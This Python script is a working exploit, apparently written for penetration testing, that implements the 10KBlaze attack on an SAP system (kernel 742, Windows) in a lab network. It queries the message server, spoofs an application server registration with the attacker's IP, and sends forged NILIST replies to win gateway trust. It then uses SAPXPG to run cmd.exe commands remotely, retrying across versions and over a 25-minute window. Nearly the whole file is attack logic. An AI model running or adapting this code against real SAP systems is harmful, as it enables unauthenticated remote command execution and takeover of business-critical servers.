#!/usr/bin/env python3
"""
run_10kblaze_w74.py - 10KBlaze exploit targeting W74 (kernel 742, Windows).

Implements the FULL gelim attack flow with all enhancements for kernel 742:
  1. MS_DUMP_RELEASE to query target kernel version
  2. MS_SET_PROPERTY with matching release info (CRITICAL for 742)
  3. LOGIN_2 + MOD_STATE registration with proper DP version
  4. MS_CHANGE_IP + MS_SET_LOGON
  5. Proactive ADM_NILIST injection (gelim step 5)
  6. Wait for NILIST request and reply
  7. SAPXPG command execution retries

Key differences from S4H (kernel 793):
  - Kernel 742 does NOT have internal_ip_addr_adm shared memory
  - Kernel 742 does NOT have GWSYST in gwrd
  - Trust propagation uses GWMON (RGWMON_SEND_NILIST) or MS direct NILIST
  - MS_SET_PROPERTY with matching release is CRITICAL (gelim reference)
  - May need gwrd restart to pick up server list changes

For authorized security testing only.
"""

import sys
import socket
import struct
import threading
import time
import uuid

sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

import sap_ms_betrusted as ms
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send as gw_ni_send, ni_recv as gw_ni_recv,
    ni_drain, hexdump, extract_p4_output,
)

# ---- W74 target parameters ----
MS_HOST     = '192.168.2.29'
MS_PORT     = 3941          # MS internal port (instance 40 + 3900 = 3940, but user says 3941)
GW_HOST     = '192.168.2.29'
GW_PORT     = 3340          # GW port (instance 40)
ATT_IP      = '192.168.2.210'
SID         = 'W74'
INSTANCE_NR = 40
INSTANCE    = '40'
HOSTNAME    = 'saperp'      # Must be DNS-resolvable on the target (hosts file)
KERNEL      = '742'
DEST        = 'T_75'
CLIENT      = '001'
COMMAND     = r'C:\Windows\System32\cmd.exe'
PARAMS      = '/c whoami'
TIMEOUT     = 15

# MS opcodes
MS_OPCODE_DUMP_INFO    = 0x1E
MS_OPCODE_SET_PROPERTY = 0x43
MS_OPCODE_SERVER_LST   = 0x05
MS_OPCODE_FILE_RELOAD  = 0x1F
MS_DUMP_RELEASE        = 8


# =========================================================================
# Packet builders for gelim-style flow
# =========================================================================

def pkt_dump_release(fromname, key, toname="MSG_SERVER"):
    """MS_DUMP_INFO with dump_command=MS_DUMP_RELEASE."""
    hdr = ms.ms_build_header(
        toname=toname, fromname=fromname,
        msgtype=ms.MSG_DIA, flag=ms.FLAG_REQUEST, iflag=ms.IFLAG_SEND_NAME,
        key=key,
    )
    body  = struct.pack("BBBB", MS_OPCODE_DUMP_INFO, 0, 0, 0)
    body += struct.pack("B", 2)          # dump_dest = 2
    body += b"\x00\x00\x00"             # filler
    body += struct.pack("!H", 0)        # dump_index
    body += struct.pack("!H", MS_DUMP_RELEASE)
    body += b" " * 40                   # dump_name
    return hdr + body


def parse_dump_release(data):
    """Extract kernel release / patch from MS_DUMP_RELEASE response."""
    result = {"release": "", "patchno": 0, "platform": 0, "raw": ""}
    if len(data) < 114:
        return result
    text = data[114:].decode("ascii", errors="replace")
    result["raw"] = text

    for line_marker, key_name in [
        ("kernel release", "release"),
        ("source id", "source_id"),
        ("platform", "platform_str"),
    ]:
        idx = text.find(line_marker)
        if idx < 0:
            continue
        eq = text.find("=", idx)
        if eq < 0:
            continue
        val = text[eq + 1:eq + 30].strip().split()[0] if text[eq + 1:eq + 30].strip().split() else ""
        if key_name == "release":
            result["release"] = val
        elif key_name == "source_id" and "." in val:
            try:
                result["patchno"] = int(val.split(".")[-1])
            except ValueError:
                pass
        elif key_name == "platform_str":
            try:
                result["platform"] = int(val)
            except ValueError:
                pass
    return result


def pkt_set_property_release(fromname, key, release="742", patchno=0,
                             platform=390, toname="MSG_SERVER"):
    """MS_SET_PROPERTY with Release information (property id=7)."""
    hdr = ms.ms_build_header(
        toname=toname, fromname=fromname,
        msgtype=ms.MSG_DIA, flag=ms.FLAG_REQUEST, iflag=ms.IFLAG_SEND_NAME,
        key=key,
    )
    body = struct.pack("BBBB", MS_OPCODE_SET_PROPERTY, 0, 0, 0)
    # SAPMSProperty for id=7 (Release information)
    prop  = b"\x00" * 40                                   # client (40B)
    prop += struct.pack("!I", 7)                            # id = 7
    rel_b = release.encode("ascii")[:9]
    prop += rel_b + b"\x00" * (10 - len(rel_b))            # release (10B)
    prop += struct.pack("!I", patchno)                      # patchno
    prop += struct.pack("!I", 0)                            # supplvl
    prop += struct.pack("!I", platform)                     # platform
    return hdr + body + prop


def pkt_server_lst(fromname, key, toname="MSG_SERVER"):
    """MS_SERVER_LST to verify registration."""
    hdr = ms.ms_build_header(
        toname=toname, fromname=fromname,
        msgtype=ms.MSG_DIA, flag=ms.FLAG_REQUEST, iflag=ms.IFLAG_SEND_NAME,
        key=key,
    )
    body = struct.pack("BBBB", MS_OPCODE_SERVER_LST, 0, 104, 0)
    return hdr + body


def pkt_file_reload(fromname, key, toname="MSG_SERVER"):
    """MS_FILE_RELOAD to reload config."""
    hdr = ms.ms_build_header(
        toname=toname, fromname=fromname,
        msgtype=ms.MSG_DIA, flag=ms.FLAG_REQUEST, iflag=ms.IFLAG_SEND_NAME,
        key=key,
    )
    body = struct.pack("BBBB", MS_OPCODE_FILE_RELOAD, 0, 0, 0)
    return hdr + body


# =========================================================================
# Login/logout helpers (separate connections, gelim-style)
# =========================================================================

def ms_login(host, port, fromname, timeout=TIMEOUT):
    """Open TCP, send LOGIN_2, return (sock, key) or (None, None)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        ms.ni_send(sock, ms.pkt_login_2(fromname))
        resp = ms.ni_recv(sock, timeout)
        hdr = ms.ms_parse_header(resp)
        if not hdr or hdr.get("errorno", 0) != 0:
            print(f"  [-] LOGIN failed (errorno={hdr.get('errorno', -1) if hdr else 'N/A'})")
            sock.close()
            return None, None
        key = hdr.get("key", b"\x00" * 8)
        return sock, key
    except Exception as e:
        print(f"  [-] Connection failed: {e}")
        try:
            sock.close()
        except Exception:
            pass
        return None, None


def ms_logout(sock, fromname, key):
    """Clean logout + close."""
    try:
        ms.ni_send(sock, ms.pkt_logout(fromname, key))
    except Exception:
        pass
    try:
        sock.close()
    except Exception:
        pass


# =========================================================================
# XPG runner
# =========================================================================

def run_sapxpg(label=""):
    """Attempt SAPXPG_START_XPG_LONG on the W74 gateway."""
    tag = f"[{label}] " if label else ""
    print(f"\n{tag}SAPXPG attempt: {COMMAND} {PARAMS}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f"{tag}GW connect failed: {e}")
        return None  # None = connection error, distinct from secinfo denial

    local_ip = sock.getsockname()[0]

    # P1
    gw_ni_send(sock, build_p1(GW_HOST, INSTANCE))
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print(f"{tag}P1 timeout")
        sock.close()
        return None
    for f in frames:
        if parse_response(f)["error"]:
            print(f"{tag}P1 rejected: {parse_response(f)['error_msg']}")
            sock.close()
            return None
    print(f"{tag}P1 OK")

    # P2
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    gw_ni_send(sock, p2)
    conv_id = None
    gw_id = 0
    p2_appc_rc = None
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            info = parse_response(f)
            if info["error"]:
                print(f"{tag}P2 error: {info['error_msg']}")
                sock.close()
                return 20  # secinfo/reginfo denied
            if info["conv_id"] and not conv_id:
                conv_id = info["conv_id"]
            if info.get("gw_id") is not None:
                gw_id = info["gw_id"]
        # Check appc_rc in P2 response header (offset 32:36 in RFC header)
        if len(resp) >= 36:
            p2_appc_rc = struct.unpack("!I", resp[32:36])[0]
        if p2_appc_rc == 20:
            print(f"{tag}P2 appc_rc=20 => secinfo DENIED (USER-HOST not 'internal')")
            sock.close()
            return 20
    except socket.timeout:
        print(f"{tag}P2 timeout (GW dropped F_SAP_INIT)")
        sock.close()
        return False

    print(f"{tag}P2: conv_id={conv_id} gw_id={gw_id} appc_rc={p2_appc_rc}")
    if not conv_id:
        conv_id = "0"

    # P3
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                   KERNEL, DEST, CLIENT, COMMAND, PARAMS, gw_id=gw_id)
    gw_ni_send(sock, p3)
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 2)
    except socket.timeout:
        print(f"{tag}P3 timeout")
        sock.close()
        return None

    appc_rc = None
    strtstat = None
    p3_output = []
    for f in frames:
        # Extract appc_rc from RFC header offset 30:34
        if len(f) >= 34 and appc_rc is None:
            appc_rc = struct.unpack("!I", f[30:34])[0]
        info = parse_response(f)
        if info["error"]:
            print(f"{tag}P3 error: {info['error_msg']}  appc_rc={appc_rc}")

            # Check the gw log classification by looking at the error
            if appc_rc == 20:
                print(f"{tag}  => secinfo DENIED (appc_rc=20). USER-HOST is not 'internal'.")
            sock.close()
            return appc_rc

        p3_output.extend(extract_p4_output(f))
        if info.get("strtstat") and not strtstat:
            strtstat = info["strtstat"]

    print(f"{tag}P3 appc_rc={appc_rc}  strtstat={strtstat}")

    if p3_output:
        print(f"{tag}*** COMMAND OUTPUT (P3) ***")
        for ln in p3_output:
            print(f"    {ln}")
        sock.close()
        return 0  # success

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                   KERNEL, DEST, CLIENT, gw_id=gw_id)
    gw_ni_send(sock, p4)
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if not info["error"]:
            output = extract_p4_output(resp)
            if output:
                print(f"{tag}*** COMMAND OUTPUT (P4) ***")
                for ln in output:
                    print(f"    {ln}")
                sock.close()
                return 0
    except (socket.timeout, ConnectionError):
        pass

    sock.close()
    return appc_rc


# =========================================================================
# Main exploit flow
# =========================================================================

def main():
    print("=" * 70)
    print(" 10KBlaze W74 — kernel 742, Windows")
    print(f" MS {MS_HOST}:{MS_PORT}  GW {GW_HOST}:{GW_PORT}  Attacker {ATT_IP}")
    print(f" Hostname: {HOSTNAME}  SID: {SID}  Instance: {INSTANCE}")
    print("=" * 70)

    # ==================================================================
    # PHASE 1: Probe — get MS name
    # ==================================================================
    print(f"\n{'='*60}")
    print("PHASE 1: Probe MS")
    print(f"{'='*60}")
    s1, k1 = ms_login(MS_HOST, MS_PORT, "sapmap_probe")
    if not s1:
        print("[-] Cannot connect to MS — aborting")
        sys.exit(1)
    ms_name = ""
    # Re-do to get fromname from response
    ms_logout(s1, "sapmap_probe", k1)
    # Actually we need to parse the response header to get ms_name
    # Let's do it properly:
    probe_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    probe_sock.settimeout(TIMEOUT)
    probe_sock.connect((MS_HOST, MS_PORT))
    ms.ni_send(probe_sock, ms.pkt_login_2("sapmap_probe"))
    probe_resp = ms.ni_recv(probe_sock, TIMEOUT)
    probe_hdr = ms.ms_parse_header(probe_resp)
    if probe_hdr and probe_hdr.get("errorno", 0) == 0:
        ms_name = probe_hdr.get("fromname", "")
        k_probe = probe_hdr.get("key", b"\x00" * 8)
        print(f"[+] MS name: {ms_name!r}")
        print(f"[+] MS key:  {k_probe.hex()}")
    else:
        print(f"[-] MS login failed")
        probe_sock.close()
        sys.exit(1)
    ms_logout(probe_sock, "sapmap_probe", k_probe)

    # ==================================================================
    # PHASE 2: MS_DUMP_RELEASE — get kernel version
    # ==================================================================
    print(f"\n{'='*60}")
    print("PHASE 2: MS_DUMP_RELEASE")
    print(f"{'='*60}")
    s2, k2 = ms_login(MS_HOST, MS_PORT, "sapmap_dump")
    release = KERNEL
    patchno = 8
    platform = 390  # Windows NT x86_64
    if s2:
        ms.ni_send(s2, pkt_dump_release("sapmap_dump", k2, toname=ms_name or "MSG_SERVER"))
        try:
            dump_resp = ms.ni_recv(s2, TIMEOUT)
            print(f"[*] MS_DUMP_RELEASE response: {len(dump_resp)}B")
            info = parse_dump_release(dump_resp)
            if info["release"]:
                release = info["release"]
            if info["patchno"]:
                patchno = info["patchno"]
            if info["platform"]:
                platform = info["platform"]
            print(f"[+] Detected: release={release} patchno={patchno} platform={platform}")
            raw = info["raw"][:800].replace("\x00", "").strip()
            if raw:
                print(f"[*] Raw response:\n{raw}")
        except (socket.timeout, TimeoutError):
            print(f"[*] No response (timeout) — using defaults")
        except Exception as e:
            print(f"[!] Error: {e}")
        ms_logout(s2, "sapmap_dump", k2)
    else:
        print(f"[*] Could not login for dump — using defaults")

    # ==================================================================
    # PHASE 3: MS_SET_PROPERTY — match release info
    # ==================================================================
    print(f"\n{'='*60}")
    print(f"PHASE 3: MS_SET_PROPERTY (release={release}, patchno={patchno}, platform={platform})")
    print(f"{'='*60}")
    # Generate the server name we'll register as
    # For W74, the hostname in the MS hosts file is "ubuntu" (192.168.2.210 ubuntu)
    # The server name convention is <hostname>_<SID>_<NN>
    # "ubuntu" is resolvable on W74's hosts file
    suffix = uuid.uuid4().hex[:4]
    our_name = f"ubuntu_{SID}_{INSTANCE_NR:02d}_{suffix}"
    print(f"[*] Server name: {our_name}")

    s3, k3 = ms_login(MS_HOST, MS_PORT, our_name)
    if s3:
        prop_pkt = pkt_set_property_release(
            our_name, k3, release=release, patchno=patchno, platform=platform,
            toname=ms_name or "MSG_SERVER")
        ms.ni_send(s3, prop_pkt)
        try:
            resp3 = ms.ni_recv(s3, 5.0)
            h3 = ms.ms_parse_header(resp3)
            print(f"[+] MS_SET_PROPERTY reply: {len(resp3)}B "
                  f"errorno={h3.get('errorno', '?') if h3 else 'N/A'}")
            # Dump response for debugging
            if len(resp3) > ms._HEADER_LEN:
                body = resp3[ms._HEADER_LEN:ms._HEADER_LEN + 20]
                print(f"    body hex: {body.hex()}")
        except (socket.timeout, TimeoutError):
            print(f"[*] No reply (timeout — may be OK)")
        ms_logout(s3, our_name, k3)
    else:
        print(f"[!] Could not login for set_property")

    # Short delay between sessions
    time.sleep(0.5)

    # ==================================================================
    # PHASE 4: Registration — LOGIN_2 + MOD_STATE + CHANGE_IP + SET_LOGON
    # ==================================================================
    # Try dp_version=13 (correct for kernel 742), then 14, then 11
    for dp_version in [13, 14, 11]:
        print(f"\n{'='*60}")
        print(f"PHASE 4: Registration (dp_version={dp_version})")
        print(f"{'='*60}")

        # Fresh name for each attempt
        suffix = uuid.uuid4().hex[:4]
        our_name = f"ubuntu_{SID}_{INSTANCE_NR:02d}_{suffix}"
        print(f"[*] Server name: {our_name}")

        main_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        main_sock.settimeout(TIMEOUT)
        try:
            main_sock.connect((MS_HOST, MS_PORT))
        except Exception as e:
            print(f"[-] Connect failed: {e}")
            continue

        # LOGIN_2
        ms.ni_send(main_sock, ms.pkt_login_2(our_name, diag_port=3200))
        resp = ms.ni_recv(main_sock, TIMEOUT)
        hdr = ms.ms_parse_header(resp)
        if not hdr or hdr.get("errorno", 0) != 0:
            print(f"[-] Login failed: {hdr.get('errorno', 'N/A') if hdr else 'no hdr'}")
            main_sock.close()
            continue
        key = hdr.get("key", b"\x00" * 8)
        print(f"[+] Logged in: key={key.hex()}")

        # MOD_STATE START
        dp_info = ms.build_dp_info(our_name, INSTANCE_NR, dp_version, ATT_IP)
        print(f"[*] MOD_STATE START (dp_version={dp_version}, {len(dp_info)}B)")
        ms.ni_send(main_sock, ms.pkt_mod_state(our_name, key, ms.MSG_DIA_ENQ, dp_info))
        time.sleep(0.3)

        # MS_CHANGE_IP
        print(f"[*] MS_CHANGE_IP ({ATT_IP})")
        ms.ni_send(main_sock, ms.pkt_change_ip(our_name, key, ATT_IP))
        try:
            ci_resp = ms.ni_recv(main_sock, 5.0)
            ci_hdr = ms.ms_parse_header(ci_resp)
            print(f"[+] CHANGE_IP reply: {len(ci_resp)}B errorno={ci_hdr.get('errorno', '?') if ci_hdr else 'N/A'}")
            if ci_hdr:
                print(f"    flag={ci_hdr.get('flag', -1):#04x} from={ci_hdr.get('fromname', '?')}")
            # Check if our IP appears in the response (server list broadcast)
            if socket.inet_aton(ATT_IP) in ci_resp:
                print(f"    [+] Our IP {ATT_IP} found (binary) in reply!")
            if ATT_IP.encode("ascii") in ci_resp:
                print(f"    [+] Our IP {ATT_IP} found (ASCII) in reply!")
            # Dump opcode section
            if len(ci_resp) > ms._HEADER_LEN + 4:
                opc = ci_resp[ms._HEADER_LEN:ms._HEADER_LEN + 4]
                print(f"    opcode section: {opc.hex()}")
                # If this is a server list, show some of the body
                body_preview = ci_resp[ms._HEADER_LEN:ms._HEADER_LEN + 80]
                print(f"    body[0:80]: {body_preview.hex()}")
        except (socket.timeout, TimeoutError):
            print(f"[*] CHANGE_IP: no reply (timeout)")

        # MS_SET_LOGON x3 (gelim does DIAG, DIAG, RFC)
        for label, port_num, logon_type in [("DIAG1", 3200, 2), ("DIAG2", 3200, 2), ("RFC", 3300, 6)]:
            print(f"[*] SET_LOGON {label} (port={port_num}, type={logon_type})")
            ms.ni_send(main_sock, ms.pkt_set_logon(
                our_name, key, ATT_IP, port_num, logon_type=logon_type))
            try:
                sl_resp = ms.ni_recv(main_sock, 3.0)
                sl_hdr = ms.ms_parse_header(sl_resp)
                print(f"    reply: {len(sl_resp)}B errorno={sl_hdr.get('errorno', '?') if sl_hdr else 'N/A'}")
            except (socket.timeout, TimeoutError):
                print(f"    no reply (timeout)")

        # MOD_STATE ACTIVE
        print(f"[*] MOD_STATE ACTIVE")
        ms.ni_send(main_sock, ms.pkt_mod_state(our_name, key, ms.MSG_DIA, dp_info))
        time.sleep(0.5)

        # ==================================================================
        # PHASE 5: ADM_NILIST injection SKIPPED
        # CONFIRMED: Both old and new format ADM_NILIST cause MS to close
        # our TCP connection, killing the registration. Must NOT send.
        # ==================================================================
        print(f"\n[*] PHASE 5: ADM_NILIST skipped (causes MS to close connection)")

        # PHASE 5b: Start NILIST TCP listener (in case dispatcher connects)
        print(f"\n[*] PHASE 5b: Starting NILIST TCP listener for pull model")
        nilist_listener_port = ms._start_nilist_listener(ATT_IP, port=0)
        if nilist_listener_port:
            print(f"[+] NILIST listener on port {nilist_listener_port}")

        # ==================================================================
        # PHASE 6: Verify registration
        # ==================================================================
        print(f"\n[*] PHASE 6: MS_SERVER_LST — verify registration")
        try:
            ms.ni_send(main_sock, pkt_server_lst(our_name, key,
                                                  toname=ms_name or "MSG_SERVER"))
            srv_resp = ms.ni_recv(main_sock, 5.0)
            print(f"[*] SERVER_LST response: {len(srv_resp)}B")
            checks = {
                "our_name (ASCII)": our_name.encode("ascii"),
                "our_IP (ASCII)": ATT_IP.encode("ascii"),
                "our_IP (binary)": socket.inet_aton(ATT_IP),
            }
            for label, needle in checks.items():
                found = needle in srv_resp
                print(f"    {label}: {'FOUND' if found else 'not found'}")
        except (socket.timeout, TimeoutError):
            print(f"[*] SERVER_LST: no reply")
        except Exception as e:
            print(f"[!] SERVER_LST error: {e}")

        # ==================================================================
        # PHASE 7: Quick XPG test BEFORE waiting for NILIST
        # ==================================================================
        print(f"\n[*] PHASE 7: Quick XPG test (dp_version={dp_version})")
        time.sleep(2)
        rc = run_sapxpg(f"dp{dp_version}-pre")
        if rc == 0:
            print(f"\n{'*'*60}")
            print(f"*** 10KBlaze W74 SUCCEEDED (dp_version={dp_version}, pre-NILIST) ***")
            print(f"{'*'*60}")
            main_sock.close()
            sys.exit(0)
        elif rc == 20:
            print(f"[*] secinfo denied (expected — trust not propagated yet)")
        else:
            print(f"[*] XPG result: {rc}")

        # ==================================================================
        # PHASE 8: Wait for NILIST request from MS
        # Also: parse the dp_version from the request to match format
        # ==================================================================
        NILIST_WAIT = 1500  # 25 minutes
        print(f"\n{'='*60}")
        print(f"PHASE 8: Wait for NILIST request (up to {NILIST_WAIT//60}min)")
        print(f"{'='*60}")

        stop_event = threading.Event()
        nilist_got = [False]

        def nilist_waiter():
            """Custom NILIST handler that extracts dp_version and tries
            different reply formats."""
            deadline = time.time() + NILIST_WAIT
            while time.time() < deadline:
                remaining = deadline - time.time()
                try:
                    pkt = ms.ni_recv(main_sock, min(remaining, 1.0))
                except (socket.timeout, TimeoutError):
                    continue
                except (ConnectionError, OSError):
                    print(f"[!] NILIST wait: connection lost")
                    break

                if len(pkt) < ms._HEADER_LEN:
                    continue

                hdr2 = ms.ms_parse_header(pkt)
                if not hdr2:
                    continue

                flag = hdr2.get("flag", -1)
                opc = ms.ms_parse_opcode(pkt)
                try:
                    ip_bytes = socket.inet_aton(ATT_IP)
                    ip_tag = " [OUR IP FOUND]" if ip_bytes in pkt else ""
                except Exception:
                    ip_tag = ""
                print(f"[*] Wait: flag={flag:#04x} iflag={hdr2.get('iflag', -1):#04x} "
                      f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)}{ip_tag}")

                # Scan for ADM eye-catcher
                adm_pos = pkt.find(ms._ADM_EYE, ms._HEADER_LEN)
                if adm_pos < 0:
                    continue

                adm = pkt[adm_pos:]
                if len(adm) < ms._ADM_HDR_LEN + 1:
                    continue

                first_opcode = adm[ms._ADM_HDR_LEN]
                print(f"[*] ADM eye at offset {adm_pos}, opcode={first_opcode:#04x}")

                if first_opcode != ms.ADM_GET_NILIST_PORT:
                    continue

                # Parse dp_version from the DP info blob
                # Layout after 110-byte header: [0:4] opcode fields, [4:] DP info
                # DP info: [0] dp_len_low, [1] dp_version, ...
                dp_info_offset = ms._HEADER_LEN + 4  # skip 4-byte opcode section
                req_dp_version = -1
                if adm_pos > dp_info_offset + 2:
                    dp_info_blob = pkt[dp_info_offset:adm_pos]
                    if len(dp_info_blob) >= 2:
                        dp_len_low = dp_info_blob[0]
                        req_dp_version = dp_info_blob[1]
                    print(f"[*] DP info: dp_len_low={dp_len_low} dp_version={req_dp_version} "
                          f"({adm_pos - dp_info_offset}B between opcode and ADM)")
                    # Also show DP info fromname (bytes 13:53)
                    if len(dp_info_blob) >= 53:
                        dp_fromname = dp_info_blob[13:53].rstrip(b" \x00").decode("ascii", errors="replace")
                        print(f"[*] DP fromname: {dp_fromname!r}")
                    # Show dp_addr_from (bytes 69:73)
                    if len(dp_info_blob) >= 73:
                        dp_addr = dp_info_blob[69:73]
                        if dp_addr != b"\x00\x00\x00\x00":
                            print(f"[*] DP addr_from: {socket.inet_ntoa(dp_addr)}")
                    # Dump first 20 bytes of DP info
                    print(f"[*] DP info[0:20]: {dp_info_blob[:20].hex()}")

                # Parse the record body for details
                if len(adm) >= ms._ADM_HDR_LEN + ms._ADM_REC_SIZE:
                    rec = adm[ms._ADM_HDR_LEN:ms._ADM_HDR_LEN + ms._ADM_REC_SIZE]
                    rec_body = rec[3:]
                    print(f"[*] NILIST_PORT record body[0:20]: {rec_body[:20].hex()}")

                requestor = hdr2.get("fromname", "")
                has_dp = (adm_pos > ms._HEADER_LEN + 100)

                # Try GWMON reply (with DP routing) - this is the correct
                # format for kernel 742 which sends requests with DP info
                if has_dp:
                    print(f"[*] Sending GWMON reply (FLAG_REPLY+DP) to {requestor!r}")
                    try:
                        reply = ms.build_gwmon_nilist_reply(
                            pkt, our_name, ATT_IP, kernel_new=True)
                        ms.ni_send(main_sock, reply)
                        print(f"[+] GWMON reply sent ({len(reply)}B)")
                    except Exception as e:
                        print(f"[!] GWMON reply error: {e}")

                    # Also try sending a simpler NILIST IP reply
                    time.sleep(0.5)
                    print(f"[*] Also sending simple NILIST IP reply to {requestor!r}")
                    try:
                        reply2 = ms.build_nilist_ip_reply(
                            our_name, key, toname=requestor,
                            attacker_ip=ATT_IP)
                        ms.ni_send(main_sock, reply2)
                        print(f"[+] Simple NILIST IP reply sent ({len(reply2)}B)")
                    except Exception as e:
                        print(f"[!] Simple reply error: {e}")

                    # Also try the nilist_port_reply with port=0
                    time.sleep(0.5)
                    print(f"[*] Also sending NILIST_PORT reply (port=0, ip={ATT_IP})")
                    try:
                        reply3 = ms.build_nilist_port_reply(
                            our_name, key, nilist_port=0,
                            toname=requestor,
                            iflag=ms.IFLAG_SEND_NAME,
                            attacker_ip=ATT_IP)
                        ms.ni_send(main_sock, reply3)
                        print(f"[+] NILIST_PORT reply sent ({len(reply3)}B)")
                    except Exception as e:
                        print(f"[!] PORT reply error: {e}")
                else:
                    # No DP info - use simpler reply
                    print(f"[*] Sending NILIST IP reply to {requestor!r}")
                    try:
                        reply = ms.build_nilist_ip_reply(
                            our_name, key, toname=requestor,
                            attacker_ip=ATT_IP)
                        ms.ni_send(main_sock, reply)
                    except Exception as e:
                        print(f"[!] Reply error: {e}")

                nilist_got[0] = True
                print(f"\n[+] NILIST request RECEIVED and REPLIED (all formats)!")
                # Don't return - keep listening for more requests
                continue

        nilist_thread = threading.Thread(target=nilist_waiter, daemon=True)
        nilist_thread.start()

        # Meanwhile, periodically try SAPXPG
        t0 = time.time()
        # Schedule (seconds from now) - try after NILIST reply and at intervals
        xpg_schedule = [10, 30, 60, 120, 300, 600, 900, 1200, 1500]
        success = False
        last_nilist_state = False

        for target_t in xpg_schedule:
            elapsed = time.time() - t0
            wait = target_t - elapsed
            if wait > 0:
                # Check periodically if nilist arrived
                while time.time() - t0 < target_t:
                    if nilist_got[0] and not last_nilist_state:
                        # NILIST just arrived — give 10 sec for propagation
                        last_nilist_state = True
                        print(f"\n[*] NILIST arrived! Waiting 10s for propagation...")
                        time.sleep(10)
                        break
                    time.sleep(1)

            if not nilist_thread.is_alive() and not nilist_got[0]:
                print(f"[!] NILIST waiter thread died (connection lost?)")
                break

            elapsed = time.time() - t0
            label = f"dp{dp_version}-t{int(elapsed)}s"
            print(f"\n[*] XPG attempt at t={int(elapsed)}s (nilist_replied={nilist_got[0]})")
            rc = run_sapxpg(label)
            if rc == 0:
                success = True
                print(f"\n{'*'*60}")
                print(f"*** 10KBlaze W74 SUCCEEDED at t={int(elapsed)}s ***")
                print(f"*** dp_version={dp_version}, nilist={nilist_got[0]} ***")
                print(f"{'*'*60}")
                break
            elif rc == 20:
                print(f"[*] Still secinfo denied (appc_rc=20)")
            else:
                print(f"[*] XPG result: {rc}")

        # Clean up
        stop_event.set()
        try:
            main_sock.close()
        except Exception:
            pass

        if success:
            sys.exit(0)

        print(f"\n[!] dp_version={dp_version} did not achieve exploitation")
        print(f"    nilist_replied={nilist_got[0]}")

    # ==================================================================
    # All dp_versions tried — final summary
    # ==================================================================
    print(f"\n{'='*60}")
    print("FINAL: All dp_version attempts exhausted")
    print(f"{'='*60}")
    print("""
Possible causes:
  1. W74 kernel 742 patch 8 does NOT have GWMON programs
     (no RGWMON_SEND_NILIST / RSMONGWY_SEND_NILIST in gwrd.exe)
  2. The MS does not propagate NILIST to gwrd on this kernel
  3. gwrd on 742 reads its trusted host list at startup only
     (would require gwrd restart after betrusted registers)
  4. gw/reg_no_conn_info=1 blocks the trust path

Next steps:
  - Check dev_w0 on W74 for ThrtInternalIpAddr messages
  - Check gw_log for any mention of our IP or server name
  - Try setting gw/reg_no_conn_info=0 and restart gwrd
  - Manually add our IP to W74's hosts file as a hostname
  - Check gwrd.exe binary for GWSYST or internal_ip_addr symbols
""")
    sys.exit(1)


if __name__ == '__main__':
    main()
